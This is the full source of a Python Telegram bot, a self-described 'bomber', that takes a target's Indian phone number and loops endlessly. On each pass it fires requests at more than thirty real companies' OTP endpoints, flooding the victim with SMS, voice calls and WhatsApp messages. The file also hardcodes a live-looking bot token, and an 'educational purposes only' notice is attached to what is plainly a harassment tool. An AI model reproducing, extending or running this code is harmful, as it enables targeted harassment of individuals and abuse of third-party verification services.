#!/usr/bin/env python3

import asyncio
import aiohttp
import random
import time
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart, Command
from aiogram.client.default import DefaultBotProperties
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# --- [ CONFIGURATION ] ---
BOT_TOKEN = "8927679179:AAHSovin2ewne_VUKY7FVEA4lEz6figrVZ0"
DEVELOPER_ID = "@theplayerror"  # Developer ID
ADMIN_IDS = [5057489358]  # Add admin user IDs here

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()
stop_signals = {}
user_attacks = {}
attack_stats = {}

# --- [ ANIMATION FRAMES ] ---
ANIMATION_FRAMES = [
    "🔄 Processing...",
    "⚡ Firing APIs...", 
    "🔥 Bombarding...",
    "💥 Exploding...",
    "🚀 Launching...",
    "🎯 Targeting..."
]

# --- [ ULTIMATE API COLLECTION - FIXED ] ---
ULTIMATE_APIS = [
    # === CALL APIs ===
    {
        "name": "Tata Capital Voice Call",
        "type": "Call",
        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}'
    },
    {
        "name": "1MG Voice Call", 
        "type": "Call",
        "url": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"number":"{phone}","otp_on_call":true}}'
    },
    {
        "name": "Swiggy Call Verification",
        "type": "Call",
        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", 
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Flipkart Voice Call",
        "type": "Call",
        "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Zivame Voice Call",
        "type": "Call", 
        "url": "https://api.zivame.com/v2/customer/login/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone_number":"{phone}","otp_type":"voice"}}'
    },
    
    # === SMS APIs ===
    {
        "name": "Lenskart SMS",
        "type": "SMS",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneCode":"+91","telephone":"{phone}"}}'
    },
    {
        "name": "PharmEasy SMS",
        "type": "SMS",
        "url": "https://pharmeasy.in/api/v2/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Snitch SMS",
        "type": "SMS",
        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"+91{phone}"}}'
    },
    {
        "name": "ShipRocket SMS",
        "type": "SMS",
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'
    },
    {
        "name": "GoKwik SMS",
        "type": "SMS",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country":"in"}}'
    },
    {
        "name": "NewMe SMS",
        "type": "SMS",
        "url": "https://prodapi.newme.asia/web/otp/request",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"{phone}","resend_otp_request":true}}'
    },
    
    # === WhatsApp APIs ===
    {
        "name": "KPN WhatsApp",
        "type": "WhatsApp",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate",
        "method": "POST", 
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}'
    },
    {
        "name": "Rappi WhatsApp",
        "type": "WhatsApp",
        "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}'
    },
    {
        "name": "Eka Care WhatsApp",
        "type": "WhatsApp",
        "url": "https://auth.eka.care/auth/init",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{phone}"}},"type":"mobile"}}'
    },
    
    # === Additional Working APIs ===
    {
        "name": "Wakefit SMS",
        "type": "SMS",
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Hungama OTP",
        "type": "SMS",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'
    },
    {
        "name": "Doubtnut",
        "type": "SMS",
        "url": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}'
    },
    {
        "name": "PenPencil",
        "type": "SMS", 
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'
    },
    {
        "name": "BeepKart",
        "type": "SMS",
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","city":362}}'
    },
    {
        "name": "Smytten",
        "type": "SMS",
        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","email":"test@example.com"}}'
    },
    {
        "name": "MyHubble Money",
        "type": "SMS",
        "url": "https://api.myhubble.money/v1/auth/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNumber":"{phone}","channel":"SMS"}}'
    },
    {
        "name": "Housing.com",
        "type": "SMS",
        "url": "https://login.housing.com/api/v2/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}'
    },
    {
        "name": "RentoMojo",
        "type": "SMS",
        "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Khatabook",
        "type": "SMS",
        "url": "https://api.khatabook.com/v1/auth/request-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"wk+avHrHZf2"}}'
    },
    {
        "name": "Animall",
        "type": "SMS",
        "url": "https://animall.in/zap/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}}'
    },
    {
        "name": "Cosmofeed",
        "type": "SMS",
        "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","version":"1.4.28"}}'
    },
    {
        "name": "Spencer's",
        "type": "SMS",
        "url": "https://jiffy.spencers.in/user/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Shopper's Stop",
        "type": "SMS",
        "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","type":"SIGNIN_WITH_MOBILE"}}'
    },
    {
        "name": "Lifestyle Stores",
        "type": "SMS",
        "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"signInMobile":"{phone}","channel":"sms"}}'
    },
    {
        "name": "PokerBaazi",
        "type": "SMS",
        "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","mfa_channels":"phno"}}'
    },
    {
        "name": "My11Circle",
        "type": "SMS",
        "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","mfa_channels":"phno"}}'
    },
    {
        "name": "RummyCircle",
        "type": "SMS",
        "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","isPlaycircle":false}}'
    },
]

async def hit_api(session, api, phone, stats):
    """Hit a single API endpoint"""
    try:
        # Get URL and data
        url = api["url"]
        data = api["data"](phone) if api["data"] else None
        
        # Handle callable URLs
        if callable(url):
            url = url(phone)
        
        # Make request
        async with session.request(
            method=api["method"],
            url=url,
            headers=api["headers"],
            data=data,
            timeout=aiohttp.ClientTimeout(total=5),
            ssl=False  # Bypass SSL verification for better success rate
        ) as response:
            status = response.status
            if status in [200, 201, 202, 204]:
                api_type = api.get("type", "SMS")
                stats[api_type] = stats.get(api_type, 0) + 1
                return True
    except Exception as e:
        logger.debug(f"API {api.get('name', 'Unknown')} failed: {str(e)}")
    return False

async def animate_message(chat_id, message_id, text_prefix="", frames=None):
    """Animate a message with loading frames"""
    if frames is None:
        frames = ANIMATION_FRAMES
    
    for frame in frames:
        try:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=f"{frame} {text_prefix}"
            )
            await asyncio.sleep(0.5)
        except:
            break

def create_main_keyboard():
    """Create main reply keyboard"""
    builder = ReplyKeyboardBuilder()
    builder.row(types.KeyboardButton(text="🚀 Start Infinite Boom"))
    builder.row(types.KeyboardButton(text="📊 Check Stats"))
    builder.row(types.KeyboardButton(text="ℹ️ Help"))
    builder.row(types.KeyboardButton(text="👨‍💻 Developer"))
    return builder.as_markup(resize_keyboard=True)

def create_stop_keyboard():
    """Create stop attack keyboard"""
    builder = ReplyKeyboardBuilder()
    builder.row(types.KeyboardButton(text="🛑 STOP ATTACK"))
    builder.row(types.KeyboardButton(text="📊 Live Stats"))
    builder.row(types.KeyboardButton(text="🏠 Main Menu"))
    return builder.as_markup(resize_keyboard=True)

def create_stats_inline_keyboard():
    """Create inline keyboard for stats"""
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(text="🔄 Refresh Stats", callback_data="refresh_stats"),
        InlineKeyboardButton(text="📈 All Time Stats", callback_data="alltime_stats")
    )
    builder.row(
        InlineKeyboardButton(text="⚡ Fast Attack", callback_data="fast_attack"),
        InlineKeyboardButton(text="🐢 Slow Attack", callback_data="slow_attack")
    )
    return builder.as_markup()

@dp.message(CommandStart())
async def start_command(message: types.Message):
    """Handle /start command"""
    welcome_text = f"""
🎯 <b>CLOUD LEAKED BOMBER BOT</b> 🎯

<b>Developer:</b> {DEVELOPER_ID}
<b>Active APIs:</b> {len(ULTIMATE_APIS)}
<b>Types:</b> Calls, SMS, WhatsApp

📌 <b>Commands:</b>
• Send 10-digit number to start attack
• Use buttons below for control

🔥 <b>Features:</b>
• Multiple API endpoints
• Real-time stats
• Attack control
• Live animations
• Fast & Slow modes

⚠️ <b>Warning:</b> Use responsibly!
    """
    
    await message.answer(
        welcome_text,
        reply_markup=create_main_keyboard(),
        parse_mode="HTML"
    )

@dp.message(F.text == "ℹ️ Help")
async def help_command(message: types.Message):
    """Show help information"""
    help_text = f"""
🆘 <b>HELP & GUIDE</b> 🆘

<b>How to use:</b>
1. Click <b>'🚀 Start Infinite Boom'</b>
2. Send <b>10-digit phone number</b> (without +91)
3. Attack will start automatically
4. Use <b>'🛑 STOP ATTACK'</b> to stop

<b>Available Commands:</b>
• /start - Start bot
• /stats - Show statistics
• /stop - Stop current attack
• /help - This message

<b>Attack Types:</b>
• Calls 📞 - Voice call OTPs
• SMS 📩 - Text message OTPs
• WhatsApp 💬 - WhatsApp messages

<b>Developer:</b> {DEVELOPER_ID}
<b>Support:</b> Contact developer for issues

⚠️ <b>Legal Notice:</b>
This bot is for educational purposes only.
Misuse may lead to legal consequences.
    """
    
    await message.answer(help_text, parse_mode="HTML")

@dp.message(F.text == "👨‍💻 Developer")
async def developer_info(message: types.Message):
    """Show developer information"""
    dev_text = f"""
👨‍💻 <b>DEVELOPER INFORMATION</b>

<b>Developer:</b> {DEVELOPER_ID}
<b>Bot Version:</b> 2.0
<b>Last Updated:</b> {time.strftime('%Y-%m-%d')}

🔧 <b>Technical Details:</b>
• Built with Python & aiogram
• Async requests for speed
• Multi-API support
• Real-time monitoring

📞 <b>Contact:</b>
Telegram: {DEVELOPER_ID}
For support and feature requests

🚀 <b>Features Coming Soon:</b>
• More API endpoints
• Custom attack patterns
• Scheduled attacks
• Advanced analytics

⭐ <b>Please rate and review!</b>
    """
    
    await message.answer(dev_text, parse_mode="HTML")

@dp.message(F.text == "📊 Check Stats")
async def check_stats(message: types.Message):
    """Show current statistics"""
    user_id = message.from_user.id
    stats = attack_stats.get(user_id, {})
    
    if not stats:
        stats_text = "📊 <b>No attack statistics available yet.</b>\nStart an attack to see stats!"
    else:
        calls = stats.get('Call', 0)
        sms = stats.get('SMS', 0)
        whatsapp = stats.get('WhatsApp', 0)
        total = calls + sms + whatsapp
        
        stats_text = f"""
📊 <b>ATTACK STATISTICS</b>

<b>Total Hits:</b> {total}
<b>📞 Calls:</b> {calls}
<b>📩 SMS:</b> {sms}
<b>💬 WhatsApp:</b> {whatsapp}

<b>Success Rate:</b> {(total / (len(ULTIMATE_APIS) * (stats.get('cycles', 1))) * 100):.1f}%
<b>Active APIs:</b> {len(ULTIMATE_APIS)}
<b>Last Updated:</b> Just now
        """
    
    await message.answer(
        stats_text,
        reply_markup=create_stats_inline_keyboard(),
        parse_mode="HTML"
    )

@dp.message(F.text == "🚀 Start Infinite Boom")
async def start_attack_prompt(message: types.Message):
    """Prompt for phone number"""
    await message.answer(
        "📱 <b>Enter target phone number (10 digits):</b>\n\n"
        "Example: <code>9876543210</code>\n\n"
        "⚠️ Make sure it's 10 digits without +91",
        parse_mode="HTML"
    )

@dp.message(F.text == "🛑 STOP ATTACK")
async def stop_attack(message: types.Message):
    """Stop current attack"""
    user_id = message.from_user.id
    
    if user_id in stop_signals:
        stop_signals[user_id] = True
        await message.answer(
            "🛑 <b>Attack stopping...</b>\n"
            "Current cycle will complete and then stop.",
            reply_markup=create_main_keyboard()
        )
        
        # Clear attack state after delay
        await asyncio.sleep(2)
        if user_id in user_attacks:
            del user_attacks[user_id]
    else:
        await message.answer(
            "ℹ️ <b>No active attack to stop.</b>\n"
            "Start an attack first.",
            reply_markup=create_main_keyboard()
        )

@dp.message(F.text == "📊 Live Stats")
async def live_stats(message: types.Message):
    """Show live attack statistics"""
    user_id = message.from_user.id
    
    if user_id in attack_stats:
        stats = attack_stats[user_id]
        calls = stats.get('Call', 0)
        sms = stats.get('SMS', 0)
        whatsapp = stats.get('WhatsApp', 0)
        total = calls + sms + whatsapp
        
        live_text = f"""
📊 <b>LIVE ATTACK STATISTICS</b>

<b>Total Hits:</b> {total}
<b>📞 Calls:</b> {calls}
<b>📩 SMS:</b> {sms}
<b>💬 WhatsApp:</b> {whatsapp}

<b>Status:</b> {'⚡ ACTIVE' if user_id in user_attacks else '⏸️ PAUSED'}
<b>Last Hit:</b> {stats.get('last_update', 'N/A')}
        """
    else:
        live_text = "ℹ️ <b>No active attack.</b> Start an attack to see live stats."
    
    await message.answer(live_text, parse_mode="HTML")

@dp.message(F.text == "🏠 Main Menu")
async def main_menu(message: types.Message):
    """Return to main menu"""
    await message.answer(
        "🏠 <b>Main Menu</b>\nSelect an option:",
        reply_markup=create_main_keyboard(),
        parse_mode="HTML"
    )

@dp.callback_query(F.data == "refresh_stats")
async def refresh_stats_callback(callback: types.CallbackQuery):
    """Refresh statistics"""
    user_id = callback.from_user.id
    stats = attack_stats.get(user_id, {})
    
    calls = stats.get('Call', 0)
    sms = stats.get('SMS', 0)
    whatsapp = stats.get('WhatsApp', 0)
    total = calls + sms + whatsapp
    
    stats_text = f"""
🔄 <b>STATISTICS REFRESHED</b>

<b>Total Hits:</b> {total}
<b>📞 Calls:</b> {calls}
<b>📩 SMS:</b> {sms}
<b>💬 WhatsApp:</b> {whatsapp}

<b>Updated:</b> {time.strftime('%H:%M:%S')}
    """
    
    await callback.message.edit_text(
        stats_text,
        reply_markup=create_stats_inline_keyboard(),
        parse_mode="HTML"
    )
    await callback.answer("✅ Statistics refreshed!")

@dp.callback_query(F.data == "alltime_stats")
async def alltime_stats_callback(callback: types.CallbackQuery):
    """Show all-time statistics"""
    # This would track all attacks, for now show current
    await callback.answer("📈 All-time stats feature coming soon!")

@dp.callback_query(F.data == "fast_attack")
async def fast_attack_callback(callback: types.CallbackQuery):
    """Switch to fast attack mode"""
    user_id = callback.from_user.id
    if user_id in user_attacks:
        user_attacks[user_id]['delay'] = 2  # 2 seconds delay
        await callback.answer("⚡ Fast mode activated (2s delay)")
    else:
        await callback.answer("Start an attack first!")

@dp.callback_query(F.data == "slow_attack")
async def slow_attack_callback(callback: types.CallbackQuery):
    """Switch to slow attack mode"""
    user_id = callback.from_user.id
    if user_id in user_attacks:
        user_attacks[user_id]['delay'] = 10  # 10 seconds delay
        await callback.answer("🐢 Slow mode activated (10s delay)")
    else:
        await callback.answer("Start an attack first!")

@dp.message(F.text.regexp(r'^\d{10}$'))
async def handle_phone_number(message: types.Message):
    """Handle phone number input and start attack"""
    user_id = message.from_user.id
    phone = message.text
    
    # Validate phone number
    if not phone.startswith(('6', '7', '8', '9')):
        await message.answer(
            "❌ <b>Invalid phone number!</b>\n"
            "Indian numbers start with 6,7,8, or 9.\n"
            "Please enter a valid 10-digit number.",
            parse_mode="HTML"
        )
        return
    
    # Initialize attack
    stop_signals[user_id] = False
    user_attacks[user_id] = {
        'phone': phone,
        'start_time': time.time(),
        'delay': 5,  # Default delay
        'cycles': 0
    }
    attack_stats[user_id] = {
        'Call': 0,
        'SMS': 0,
        'WhatsApp': 0,
        'cycles': 0,
        'last_update': time.strftime('%H:%M:%S')
    }
    
    # Send starting animation
    start_msg = await message.answer(
        "🎯 <b>INITIALIZING ATTACK...</b>\n\n"
        f"<b>Target:</b> <code>{phone}</code>\n"
        f"<b>APIs Loaded:</b> {len(ULTIMATE_APIS)}\n"
        f"<b>Mode:</b> INFINITE\n\n"
        "⚡ Preparing to fire...",
        parse_mode="HTML",
        reply_markup=create_stop_keyboard()
    )
    
    # Run animation
    await animate_message(message.chat.id, start_msg.message_id, f"Target: {phone}")
    
    # Start attack in background
    asyncio.create_task(run_attack(user_id, phone, message.chat.id, start_msg.message_id))
    
    # Update with initial status
    await bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=start_msg.message_id,
        text=f"🚀 <b>ATTACK STARTED!</b>\n\n"
             f"<b>Target:</b> <code>{phone}</code>\n"
             f"<b>Status:</b> Firing APIs...\n"
             f"<b>Hits:</b> 0\n"
             f"<b>Next cycle:</b> 5s",
        parse_mode="HTML",
        reply_markup=create_stop_keyboard()
    )

async def run_attack(user_id, phone, chat_id, message_id):
    """Run the attack loop"""
    stats = attack_stats[user_id]
    attack_info = user_attacks[user_id]
    delay = attack_info['delay']
    
    async with aiohttp.ClientSession() as session:
        cycle_count = 0
        
        while not stop_signals.get(user_id, False):
            try:
                cycle_count += 1
                attack_info['cycles'] = cycle_count
                stats['cycles'] = cycle_count
                
                # Fire all APIs
                tasks = [hit_api(session, api, phone, stats) for api in ULTIMATE_APIS]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                # Calculate hits
                calls = stats.get('Call', 0)
                sms = stats.get('SMS', 0)
                whatsapp = stats.get('WhatsApp', 0)
                total = calls + sms + whatsapp
                
                # Update message
                stats['last_update'] = time.strftime('%H:%M:%S')
                
                # Update status message
                status_text = f"""
🎯 <b>ACTIVE ATTACK - CYCLE {cycle_count}</b>

<b>Target:</b> <code>{phone}</code>
<b>Status:</b> ⚡ RUNNING
<b>Delay:</b> {delay}s

📊 <b>STATISTICS:</b>
<b>📞 Calls:</b> {calls}
<b>📩 SMS:</b> {sms}
<b>💬 WhatsApp:</b> {whatsapp}
<b>🔥 Total Hits:</b> {total}

<b>Next cycle in:</b> {delay}s
<b>Last Update:</b> {stats['last_update']}
                """
                
                try:
                    await bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=message_id,
                        text=status_text,
                        parse_mode="HTML",
                        reply_markup=create_stop_keyboard()
                    )
                except Exception as e:
                    logger.error(f"Failed to update message: {e}")
                
                # Check if we should stop
                if stop_signals.get(user_id, False):
                    break
                    
                # Wait for next cycle
                await asyncio.sleep(delay)
                
            except Exception as e:
                logger.error(f"Attack error for user {user_id}: {e}")
                await asyncio.sleep(5)  # Wait before retry
    
    # Attack stopped
    final_stats = attack_stats.get(user_id, {})
    calls = final_stats.get('Call', 0)
    sms = final_stats.get('SMS', 0)
    whatsapp = final_stats.get('WhatsApp', 0)
    total = calls + sms + whatsapp
    
    final_text = f"""
🛑 <b>ATTACK STOPPED</b>

<b>Target:</b> <code>{phone}</code>
<b>Total Cycles:</b> {cycle_count}
<b>Duration:</b> {time.time() - attack_info['start_time']:.1f}s

📊 <b>FINAL STATISTICS:</b>
<b>📞 Calls:</b> {calls}
<b>📩 SMS:</b> {sms}
<b>💬 WhatsApp:</b> {whatsapp}
<b>🔥 Total Hits:</b> {total}

<b>Status:</b> ✅ COMPLETED
<b>Time:</b> {time.strftime('%H:%M:%S')}
    """
    
    try:
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=final_text,
            parse_mode="HTML",
            reply_markup=create_main_keyboard()
        )
    except:
        pass
    
    # Clean up
    if user_id in stop_signals:
        del stop_signals[user_id]
    if user_id in user_attacks:
        del user_attacks[user_id]

@dp.message(Command("stop"))
async def stop_command(message: types.Message):
    """Handle /stop command"""
    await stop_attack(message)

@dp.message(Command("stats"))
async def stats_command(message: types.Message):
    """Handle /stats command"""
    await check_stats(message)

@dp.message(Command("help"))
async def help_command_handler(message: types.Message):
    """Handle /help command"""
    await help_command(message)

@dp.message()
async def handle_other_messages(message: types.Message):
    """Handle other messages"""
    if message.text:
        await message.answer(
            "❓ <b>Unknown command!</b>\n\n"
            "Use /help to see available commands or use the buttons below.",
            reply_markup=create_main_keyboard(),
            parse_mode="HTML"
        )

async def main():
    """Main function to start the bot"""
    logger.info("Starting Ultimate Bomber Bot...")
    logger.info(f"Developer: {DEVELOPER_ID}")
    logger.info(f"Loaded APIs: {len(ULTIMATE_APIS)}")
    
    try:
        # Start polling
        await dp.start_polling(bot)
    except Exception as e:
        logger.error(f"Bot crashed: {e}")
        logger.info("Restarting in 5 seconds...")
        await asyncio.sleep(5)
        # Restart
        await main()

if __name__ == "__main__":
    # Run the bot
    asyncio.run(main())
